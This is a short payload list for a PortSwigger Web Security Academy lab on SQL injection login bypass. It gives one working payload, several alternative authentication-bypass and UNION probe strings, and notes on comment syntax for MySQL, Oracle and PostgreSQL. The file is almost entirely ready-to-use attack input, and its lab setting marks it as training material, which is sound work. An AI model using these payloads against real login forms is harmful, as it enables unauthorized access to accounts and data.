# SQL Injection Login Bypass Payloads
# Lab: SQL injection vulnerability allowing login bypass
# Platform: PortSwigger Web Security Academy

# --- Working Payload ---
administrator'--

# --- Alternative Payloads ---
administrator' OR '1'='1'--
' OR '1'='1'--
' OR 1=1--
' OR '1'='1' LIMIT 1--
admin'--
admin' OR '1'='1'--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# --- Notes ---
# The comment sequence '--' must be followed by a space in some databases
# For MySQL, '-- ' (with space) or '#' or '/*' can be used
# For Oracle/PostgreSQL, '--' works but may need specific syntax
